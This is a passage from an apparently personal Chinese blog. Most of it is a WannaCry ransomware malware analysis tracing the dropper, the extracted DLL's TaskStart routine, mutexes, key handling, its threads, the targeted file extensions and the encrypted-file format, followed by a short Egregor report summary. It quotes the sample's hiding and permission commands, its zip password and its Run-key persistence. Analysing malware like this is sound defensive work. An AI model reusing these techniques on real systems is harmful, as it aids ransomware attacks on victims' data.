<p>并且，将<code>c.wnry</code>中部分内容与勒索软件界面的比特币账户信息进行对比，可以看出是同一个，所以<code>c.wnry</code>文件中存储的是比特币账户信息</p>
</li>
</ul>
<h4 id="隐藏当前文件夹和创建账户"><a href="#隐藏当前文件夹和创建账户" class="headerlink" title="隐藏当前文件夹和创建账户"></a>隐藏当前文件夹和创建账户</h4><p>均由原<code>sub_401E9E</code>函数实现，传入的参数分别为</p>
<ul>
<li>lpCommandLine（’attrib +h .’）</li>
<li>aIcaclsGrantEve（’icacls . /grant Everyone:F /T /C /Q‘）</li>
</ul>
<p>该函数结构如下，作用是创建进程并执行命令</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325150718119.png" alt="image-20210325150718119"></p>
<ul>
<li><code>attrib +h .</code>作用是隐藏当前目录</li>
<li><code>icacls . /grant Everyone:F /T /C /Q</code>作用是创建账户Everyone，授予/T /C /Q权限</li>
</ul>
<h4 id="载入部分函数API"><a href="#载入部分函数API" class="headerlink" title="载入部分函数API"></a>载入部分函数API</h4><p>由原<code>sub_40170A</code>函数实现，该函数结构为</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325192019854.png" alt="image-20210325192019854" style="zoom:80%;">

<ul>
<li>调用函数<code>sub_401A45</code>，该函数会从<code>advapi32.dll</code>载入一些Crypt开头的函数</li>
<li>从<code>kernel32.dll</code>中载入一些文件操作函数</li>
</ul>
<h4 id="初始化临界区"><a href="#初始化临界区" class="headerlink" title="初始化临界区"></a>初始化临界区</h4><p>由原<code>sub_4012FD</code>函数实现，该函数结构为</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325192710504.png" alt="image-20210325192710504" style="zoom:80%;">

<ul>
<li>调用函数<code>sub_4017DD</code>，该函数会调用函数<code>InitializeCriticalSection</code></li>
</ul>
<p>总体来说，该函数会初始化临界区，方便多线程的访问</p>
<h4 id="导入密钥并分配全局堆内存"><a href="#导入密钥并分配全局堆内存" class="headerlink" title="导入密钥并分配全局堆内存"></a>导入密钥并分配全局堆内存</h4><p>由原<code>sub_401437</code>函数实现，该函数结构为</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325193305320.png" alt="image-20210325193305320"></p>
<ul>
<li>调用函数<code>sub_401861</code>，该函数会调用<code>CryptImportKey</code>函数导入密钥</li>
<li>两次调用<code>GlobalAlloc</code>，分配全局堆内存</li>
</ul>
<h4 id="解密数据"><a href="#解密数据" class="headerlink" title="解密数据"></a>解密数据</h4><p>由原<code>sub_4014A6</code>函数实现，重要参数为“t.wnry”，该函数部分结构为</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325194452415.png" alt="image-20210325194452415" style="zoom:67%;">

<ul>
<li>前半部分会从文件<code>t.wnry</code>中读取数据到不同变量</li>
<li>后半部分会调用自定义函数进行处理，最后将处理后的数据保存在新分配的区域中，并返回该区域起始地址，推测该函数的作用为为解密<code>t.wnry</code>文件</li>
</ul>
<h4 id="加载DLL"><a href="#加载DLL" class="headerlink" title="加载DLL"></a>加载DLL</h4><p>由原<code>sub_4021BD</code>函数实现，该函数功能就是调用<code>sub_4021E9</code>函数，重要参数为此前获得的起始地址，该函数部分结构为</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325200301166.png" alt="image-20210325200301166" style="zoom:80%;">

<ul>
<li>一系列检查工作，比如<ul>
<li>调用函数<code>sub_402457</code>，判断解密的数据长度是否大于64</li>
<li>判断头两个字节是否为0x5A4D，即判断头部是否是MZ</li>
</ul>
</li>
</ul>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326150754064.png" alt="image-20210326150754064"></p>
<ul>
<li>载入函数<code>GetNativeSystemInfo</code></li>
</ul>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326151807231.png" alt="image-20210326151807231"></p>
<ul>
<li>间接调用函数<code>VirtualAlloc</code>，分配虚内存</li>
<li>调用函数<code>HeapAlloc</code>，在进程堆上分配空间</li>
</ul>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326153448991.png" alt="image-20210326153448991"></p>
<ul>
<li>该部分的代码看着有一些复杂，但其设置的变量v22会保存一些函数的地址，这些函数看起来与载入DLL密切相关，暂时结束静态分析</li>
</ul>
<p>综上，该部分会检查此前解密数据的结构是否为PE形式，并可能进行DLL载入工作，推测之前解密的数据为DLL文件，在该函数中进行载入。</p>
<p>下面尝试对该DLL文件进行提取，</p>
<ul>
<li>在虚拟机中用Ollydebug打开样本文件，于<code>00402132</code>处下一个断点，运行后，EAX寄存器内容即为解密数据的起始地址</li>
</ul>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326163249092.png" alt="image-20210326163249092"></p>
<ul>
<li><p>以下为该地址处对应的数据，可以看到明显是一个解密过后的数据，其中MZ和PE更确定是PE文件格式</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326163513527.png" alt="image-20210326163513527"></p>
</li>
<li><p>设断点于<code>0040213A</code>，截获解密后的数据长度为0x10000</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326165428529.png" alt="image-20210326165428529"></p>
</li>
<li><p>重新运行该函数，dump出解密后的数据，保存为<code>t.dll</code>，使用PEiD检查，发现确实是DLL文件</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326172626167.png" alt="image-20210326172626167"></p>
</li>
<li><p>检查该文件输出函数，发现一个<code>TaskStart</code></p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326172741044.png" alt="image-20210326172741044"></p>
</li>
</ul>
<p>之前猜想得以证明</p>
<h4 id="从DLL中导入函数TaskStart并执行"><a href="#从DLL中导入函数TaskStart并执行" class="headerlink" title="从DLL中导入函数TaskStart并执行"></a>从DLL中导入函数TaskStart并执行</h4><p>由由原<code>sub_4021BD</code>函数实现，该函数主要参数为之前获得的DLL在堆中的地址和字符串‘TaskStart’，内部结构如下</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326173440743.png" alt="image-20210326173440743"></p>
<ul>
<li>该函数会在DLL数据内与字符串’TaskStart’进行比较</li>
<li>结合之前看到DLL的输出函数为TaskStart，合理推测该函数的作用是获取<code>TaskStart</code>函数的地址</li>
</ul>
<p>在这一函数结束后，会有以函数形式执行返回值的操作，合理推测为执行<code>TaskStart</code></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>恶意程序样本主要完成以下工作</p>
<ul>
<li>修改注册表项</li>
<li>将资源节中以zip形式压缩的文件释放，解压密码为‘WNcry@2ol7’</li>
<li>将比特币账户信息写入文件<code>c.wnry</code></li>
<li>将文件<code>t.wnry</code>解密后形成的DLL载入，执行其中的TaskStart函数</li>
</ul>
<h3 id="恶意DLL与TaskStart函数"><a href="#恶意DLL与TaskStart函数" class="headerlink" title="恶意DLL与TaskStart函数"></a>恶意DLL与TaskStart函数</h3><p>用IDA查看之前提取出的<code>t.dll</code>中的<code>TaskStart</code>函数，其主要部分如下所示</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210327100712464.png" alt="image-20210327100712464" style="zoom:80%;">

<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210327100743585.png" alt="image-20210327100743585" style="zoom:80%;">

<p>经过分析后可参考如下</p>
<p>下面开始逐步分析</p>
<h4 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h4><p>由原<code>sub_4021BD</code>函数实现，该函数结构如下</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210327100937542.png" alt="image-20210327100937542"></p>
<ul>
<li>创建名为<code>MsWinZonesCacheCounterMutexA</code>的互斥体</li>
</ul>
<p>如果之前已经存在该互斥体，则程序结束，确保单一实例运行。</p>
<h4 id="读取c-wnry"><a href="#读取c-wnry" class="headerlink" title="读取c.wnry"></a>读取c.wnry</h4><p>由原<code>sub_10001000</code>函数实现，该函数结构如下</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210327101922203.png" alt="image-20210327101922203" style="zoom:80%;">

<ul>
<li>当参数a2=1时，会读取文件<code>c.wnry</code>到Buffer中</li>
</ul>
<h4 id="获取部分函数API"><a href="#获取部分函数API" class="headerlink" title="获取部分函数API"></a>获取部分函数API</h4><p>由原<code>sub_10003410</code>函数实现，该函数结构较简单，会载入<code>kernel32.dll</code>中的部分函数，主要和文件操作有关</p>
<h4 id="检查互斥体和文件"><a href="#检查互斥体和文件" class="headerlink" title="检查互斥体和文件"></a>检查互斥体和文件</h4><p>由原<code>sub_10003410</code>函数和<code>sub_10004500</code>函数实现</p>
<p>在函数<code>sub_10003410</code>函数中</p>
<ul>
<li>尝试打开互斥体<code>Global\MsWinZonesCacheCounterMutexW</code></li>
<li>没有则创建并检查互斥体<code>Global\MsWinZonesCacheCounterMutexA0</code>，并调用函数<code>sub_100013E0</code>设置属性</li>
</ul>
<p>在函数<code>sub_10004500</code>函数中</p>
<ul>
<li>检查是否存在文件<code>00000000.dky</code></li>
</ul>
<p>结合之后的分析可知，该互斥体是表示加密准备工作是否已完成的</p>
<h4 id="保存密钥"><a href="#保存密钥" class="headerlink" title="保存密钥"></a>保存密钥</h4><p>由原<code>sub_10003AC0</code>函数实现，该函数传入的两个重要参数分别为两个此前分别写入<code>00000000.pky</code>和<code>00000000.eky</code>的串，结构可参考如下</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210327104944373.png" alt="image-20210327104944373" style="zoom:80%;">

<ul>
<li>调用函数<code>sub_10003A80</code>，该函数会调用<code>CryptAcquireContextA</code>，获取加密所需密钥容器的csp的句柄</li>
<li>调用函数<code>sub_10003C00</code>，该函数会尝试打开文件<code>00000000.pky</code>并载入文件，从调用的函数来看与密钥有关，由于第一次使用时不存在该文件，返回值为0，会进入该选择段</li>
<li>调用函数<code>sub_10004350</code>，该函数会调用<code>CryptGenKey</code>，可以按照指定算法生成密钥，暂时没找到参数和算法的对应关系，但据其他报告说明是RSA。该密钥实际上包含公钥和私钥，下面称为pk和ek。</li>
<li>调用函数<code>sub_10004350</code>，该函数会创建文件<code>00000000.pky</code>并导出pk到该文件</li>
<li>调用函数<code>sub_10003C40</code>，该函数会将ek加密，然后存放在文件<code>00000000.eky</code></li>
</ul>
<p>分析完成后结构可参考如下</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210327130256949.png" alt="image-20210327130256949"></p>
<p>接下来会创建5个线程</p>
<h4 id="创建线程1：创建00000000-res文件"><a href="#创建线程1：创建00000000-res文件" class="headerlink" title="创建线程1：创建00000000.res文件"></a>创建线程1：创建00000000.res文件</h4><p>该线程会调用原函数<code>sub_10004790</code>，该函数结构如下</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210328095316358.png" alt="image-20210328095316358"></p>
<ul>
<li>调用函数<code>time</code>记录当前时间</li>
<li>调用函数<code>sub_10004730</code>，该函数会创建文件<code>00000000.res</code>(文件名在<code>TaskStart</code>函数中赋值)并往其中写入数据</li>
<li>睡眠一段时间再循环</li>
</ul>
<h4 id="创建线程2：检查文件"><a href="#创建线程2：检查文件" class="headerlink" title="创建线程2：检查文件"></a>创建线程2：检查文件</h4><p>该线程会调用原函数<code>sub_100045C0</code>，该函数结构如下</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210328100831958.png" alt="image-20210328100831958" style="zoom:80%;">

<ul>
<li>检查dky文件是否存在</li>
<li>睡眠一段时间</li>
</ul>
<h4 id="创建线程3：检测磁盘并加密"><a href="#创建线程3：检测磁盘并加密" class="headerlink" title="创建线程3：检测磁盘并加密"></a>创建线程3：检测磁盘并加密</h4><p>该线程会调用原函数<code>sub_10005730</code>，该函数结构如下</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210328101721963.png" alt="image-20210328101721963" style="zoom:80%;">

<ul>
<li>调用函数<code>GetLogicalDrives</code>获取所有磁盘信息</li>
<li>在循环体中调用函数<code>GetLogicalDrives</code>，检测是否有新磁盘加入，如果有则创建新线程加密新磁盘，该线程会调用原函数<code>sub_10005680</code>，检查该函数</li>
</ul>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210328103332749.png" alt="image-20210328103332749" style="zoom:80%;">

<ul>
<li><p>调用函数<code>sub_10001590</code>，该函数会初始化临界区</p>
</li>
<li><p>调用函数<code>sub_10001830</code></p>
</li>
<li><p>调用函数<code>sub_10005540</code>，该函数可以获取某磁盘空余容量，并在判断磁盘类型为固定磁盘后。调用函数<code>sub_100027F0</code>对该磁盘下所有文件进行加密</p>
</li>
</ul>
<h4 id="创建线程4：启动taskdl-exe"><a href="#创建线程4：启动taskdl-exe" class="headerlink" title="创建线程4：启动taskdl.exe"></a>创建线程4：启动taskdl.exe</h4><p>该线程会调用原函数<code>sub_10005300</code>，该函数会循环调用函数<code>sub_10001080</code>，<code>sub_10001080</code>的重要参数为字符串’taskdl.exe’，其结构如下</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210328104452000.png" alt="image-20210328104452000" style="zoom:80%;">

<ul>
<li>该函数作用明显为启动<code>taskdl.exe</code>线程，注意其中StartupInfo结构中dwFlags值为1，表示隐藏窗口启动</li>
</ul>
<h4 id="创建线程5：启动taskse-exe和-WanaDecryptor-exe，安装注册表启动项"><a href="#创建线程5：启动taskse-exe和-WanaDecryptor-exe，安装注册表启动项" class="headerlink" title="创建线程5：启动taskse.exe和@WanaDecryptor@.exe，安装注册表启动项"></a>创建线程5：启动taskse.exe和@WanaDecryptor@.exe，安装注册表启动项</h4><p>该线程会调用原函数<code>sub_10004990</code>，该函数结构如下</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210328105114066.png" alt="image-20210328105114066" style="zoom:80%;">

<ul>
<li>调用函数<code>Readcwnry</code>，注意此时第二个参数为0，表示写入数据</li>
<li>调用函数<code>sub_10004890</code>，该函数会启动<code>taskse.exe</code>和<code>@WanaDecryptor@.exe</code>，注意也是隐藏方式启动</li>
<li>获取<code>tasksche.exe</code>文件完整路径，保存到Buffer</li>
<li>调用函数<code>sub_100047F0</code>，该函数会调用cmd修改注册表<code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>项，安装tasksche.exe启动项</li>
</ul>
<p>启动项如下所示</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210329134040661.png" alt="image-20210329134040661" style="zoom:80%;">

<h4 id><a href="#" class="headerlink" title></a></h4><h3 id="文件加密过程分析"><a href="#文件加密过程分析" class="headerlink" title="文件加密过程分析"></a>文件加密过程分析</h3><h4 id="加密函数1"><a href="#加密函数1" class="headerlink" title="加密函数1"></a>加密函数1</h4><p>由原函数<code>sub_100027F0</code>函数实现，该层加密函数主要起过渡作用，会调用<code>sub_10002300</code>函数和<code>sub_10002940</code>函数进行加密，结构如下</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404093355277.png" alt="image-20210404093355277" style="zoom:67%;">

<h4 id="加密函数2"><a href="#加密函数2" class="headerlink" title="加密函数2"></a>加密函数2</h4><p>由原函数<code>sub_10002300</code>函数实现，该函数结构将分步分析</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404130703678.png" alt="image-20210404130703678"></p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404130723104.png" alt="image-20210404130723104"></p>
<ul>
<li>会循环查找目录下的文件，每个循环首先会判断其是否是当前目录或父目录文件，如果不是则继续</li>
<li>获取目标文件完整路径，保存到Buffer，判断该文件不是目录文件后继续</li>
<li>调用函数sub_100032C0，判断其是否是某些敏感文件，比如<code>ProgramData</code>目录下的文件，防止加密这些文件后影响系统</li>
<li>对于非敏感文件，判断其是否是病毒自带的三个资源文件，这是用来提示受害者的，如果不是则继续</li>
<li>调用函数sub_10002D60，该函数会对文件的后缀名做比较以选择是否要加密该文件，其结构如下</li>
</ul>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404131641809.png" alt="image-20210404131641809" style="zoom:67%;">

<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404131716931.png" alt="image-20210404131716931" style="zoom:67%;">

<ul>
<li>该函数首先过滤.exe和.dll文件，如果是则返回1</li>
<li>过滤.WNCRY文件，如果是则返回6</li>
<li>若文件后缀在以下字符串中，则返回2</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.doc .docx .xls .xlsx .ppt .pptx .pst .ost .msg .eml .vsd .vsdx .txt .csv .rtf .123 .wks .wk1 .pdf .dwg .onetoc2 .snt .jpeg .jpg</span><br></pre></td></tr></table></figure>

<ul>
<li>若文件后缀在以下字符串中，则返回3</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.docb .docm .dot .dotm .dotx .xlsm .xlsb .xlw .xlt .xlm .xlc .xltx .xltm .pptm</span><br><span class="line">.pot .pps .ppsm .ppsx .ppam .potx .potm .edb .hwp .602 .sxi .sti .sldx .sldm .sldm .vdi .vmdk .vmx .gpg .aes .ARC .PAQ .bz2 .tbk .bak .tar .tgz .gz .7z .rar .zip .backup .iso .vcd .bmp .png .gif .raw .cgm .tif .tiff .nef .psd .ai .svg .djvu .m4u .m3u .mid .wma .flv .3g2 .mkv .3gp .mp4 .mov .avi .asf .mpeg .vob .mpg .wmv .fla .swf .wav .mp3 .sh .class .jar .java .rb .asp .php .jsp .brd .sch .dch .dip .pl .vb .vbs .ps1 .bat .cmd .js .asm .h .pas .cpp .c .cs .suo .sln .ldf .mdf .ibd .myi .myd .frm .odb .dbf .db .mdb .accdb .sql .sqlitedb .sqlite3 .asc .lay6 .lay .mml .sxm .otg .odg .uop .std .sxd .otp .odp .wb2 .slk .dif .stc .sxc .ots .ods .3dm .max .3ds .uot .stw .sxw .ott .odt .pem .p12 .csr .crt .key .pfx .der</span><br></pre></td></tr></table></figure>

<ul>
<li>若文件后缀为.WNCYR则返回5</li>
<li>若文件后缀为.WNCRYT则返回4</li>
<li>回到加密函数2，对于返回值为2，3，4，5的文件，调用函数<code>sub_10003760</code>将该文件路径和返回值类型保存到链表数据结构中，循环查询所有文件</li>
</ul>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404133908035.png" alt="image-20210404133908035"></p>
<ul>
<li>对于路径保存到链表中的文件，根据其返回值调用函数<code>sub_10002940</code>进行加密，该函数为加密函数3，会在之后进行详细说明</li>
<li>此后会根据当前文件层数递归调用加密函数2，实现对所有目录项的遍历</li>
</ul>
<h4 id="加密函数3"><a href="#加密函数3" class="headerlink" title="加密函数3"></a>加密函数3</h4><p>由原函数<code>sub_10002940</code>函数实现，该函数结构如下</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404135053832.png" alt="image-20210404135053832" style="zoom:67%;">

<ul>
<li><p>该函数首先调用函数<code>sub_10002E70</code>判断待加密文件类型决定策略</p>
<p>函数<code>sub_10002E70</code>的返回值可参考如下</p>
<ul>
<li>对于后缀为.WNCRYT，返回2</li>
<li>对于后缀为.WNCYR，返回1</li>
<li>对于之前判断为类型3的文件，比如后缀为.docx，返回4</li>
</ul>
</li>
<li><p>策略对应为</p>
<ul>
<li>2：删除文件</li>
<li>3：调用加密函数<code>sub_10002200</code>加密链表中所有文件</li>
<li>4：加密可能剩余链表中的文件</li>
</ul>
</li>
</ul>
<h4 id="加密函数4"><a href="#加密函数4" class="headerlink" title="加密函数4"></a>加密函数4</h4><p>由原函数<code>sub_10002940</code>函数实现，该函数结构如下</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404142530858.png" alt="image-20210404142530858" style="zoom:67%;">

<ul>
<li>获取文件名字符串，在其后拼接.WNCRY</li>
<li>调用函数<code>sub_10001960</code>进行加密</li>
</ul>
<h4 id="加密函数5"><a href="#加密函数5" class="headerlink" title="加密函数5"></a>加密函数5</h4><p>由原函数<code>sub_10001960</code>函数实现，该函数结构比较复杂，会分步分析</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210405105224751.png" alt="image-20210405105224751" style="zoom:67%;">

<ul>
<li>经过一系列操作正确打开文件后，获取文件的大小和时间</li>
<li>读取文件开始8个字节，与’WANACRY!’比较，这一判断是为验证文件是否已经被加密了</li>
</ul>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210405105606047.png" alt="image-20210405105606047" style="zoom:67%;">

<ul>
<li>在文件名背后加‘T’，创建该文件，该文件此时后缀应为.WNCRYT</li>
</ul>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210405110708477.png" alt="image-20210405110708477" style="zoom:67%;">

<ul>
<li>写入加密文件头，分别为<ul>
<li>写入8字节“WANACRY!”</li>
<li>写入4字节</li>
<li>写入0x100字节的加密数据，v17在之前获得</li>
<li>写入自定义的文件类型值</li>
<li>写入原文件大小</li>
</ul>
</li>
</ul>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210405111147513.png" alt="image-20210405111147513" style="zoom:67%;">

<ul>
<li>循环读取原文件内容，每次读取0x100000个字节</li>
<li>调用函数<code>sub_10006940</code>对读取的内容进行加密，注意到参数v12一般对应值为0x10，这意味着在该函数中是以每0x10个字节为单位加密文件的</li>
<li>将加密的内容写入之前创建的加密文件内</li>
</ul>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210405112241501.png" alt="image-20210405112241501" style="zoom:67%;">

<ul>
<li>设置文件时间、文件属性，将原文件加入删除列表</li>
</ul>
<h4 id="加密过程总结"><a href="#加密过程总结" class="headerlink" title="加密过程总结"></a>加密过程总结</h4><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210405135139721.png" alt="image-20210405135139721"></p>
<p>部分可能的恢复方案</p>
<ul>
<li>由于勒索软件采用Windows的csp的API，产生密钥所用的素数可能遗留在内存中，如果未被覆盖，则存在截取并产生相同密钥的可能</li>
<li>只读文件由于不会被修改重命名，实际上不会被删除，只会调整属性为隐藏</li>
<li>部分系统盘符下特定目录下的的文件存在覆写操作，可能无法恢复</li>
<li>对于加密的文件，实际上原文件并未被立刻删除，而是被重命名后移动到对应盘符下创建的临时目录下，调用删除线程删除。</li>
</ul>
<h3 id="taskdl-exe分析"><a href="#taskdl-exe分析" class="headerlink" title="taskdl.exe分析"></a>taskdl.exe分析</h3><p>该程序会在之前TaskStart函数创建的第四个线程中被启动，其主函数结构如下</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210329125117408.png" alt="image-20210329125117408" style="zoom:67%;">

<ul>
<li>获取当前可用磁盘</li>
<li>获得当前磁盘类型，不可是远程磁盘（对应4）</li>
<li>调用函数<code>sub_401080</code>，该函数结构如下所示</li>
</ul>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210329125715150.png" alt="image-20210329125715150" style="zoom:67%;">

<ul>
<li>调用函数<code>sub_401000</code>，保存回收站和C盘下临时文件路径</li>
<li>拼接字符串，在前一路径后拼接上<code>*.WNCRYT</code>，保存到Buffer</li>
<li>遍历Buffer形式的文件，即后缀为WNCRYT的文件，获取其全路径保存到</li>
</ul>
<h3 id="WanaDecryptor-exe分析"><a href="#WanaDecryptor-exe分析" class="headerlink" title="@WanaDecryptor@.exe分析"></a>@WanaDecryptor@.exe分析</h3><p>尚未详细分析，单独运行结果是会生成壁纸，并且每几秒弹出勒索窗口</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/16/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/03/16/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/" itemprop="url">勒索软件分析报告阅读记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-16T16:57:33+08:00">
                2021-03-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="WannaRen"><a href="#WannaRen" class="headerlink" title="WannaRen"></a>WannaRen</h2><p>2020.04</p>
<h2 id="Egregor"><a href="#Egregor" class="headerlink" title="Egregor"></a>Egregor</h2><p>2020.09</p>
<h3 id="分发方法"><a href="#分发方法" class="headerlink" title="分发方法"></a>分发方法</h3><p>主要是<strong>Cobalt Strike</strong>，通过诸如RDP攻击、网络钓鱼等方式破坏目标环境，一旦Cobalt Strike信标有效负载建立并持续存在，就可以交付和启动有效负载。</p>
<p>因为Egregor是一个拥有多个分支机构的RaaS（勒索软件即服务），不同攻击者采用的攻击方式和武器化策略会有不同。</p>
<h3 id="有效负载"><a href="#有效负载" class="headerlink" title="有效负载"></a>有效负载</h3><p>Egregor有效负载（DLL）是高度模糊的，包括Salsa20加密配置数据。</p>
<p>文件加密通过ChaCha流密码和RSA的组合实现。</p>
<p>每个有效负载包含一个RSA-2048公钥。基于DLL的有效负载在启动时需要一个密钥/密码，该密钥特定于每个样本。</p>
<p>数据溢出的主要方法似乎是<code>Rclone</code></p>
<h3 id="Post-Compromise行为"><a href="#Post-Compromise行为" class="headerlink" title="Post-Compromise行为"></a>Post-Compromise行为</h3><p>Egregor会在受害者不遵守赎金要求的情况下将泄露的数据发布到自己的博客上</p>
<p>其赎金记录遵循一个模板，指示受害者访问其基于TOR的支付门户以获取进一步的指示</p>
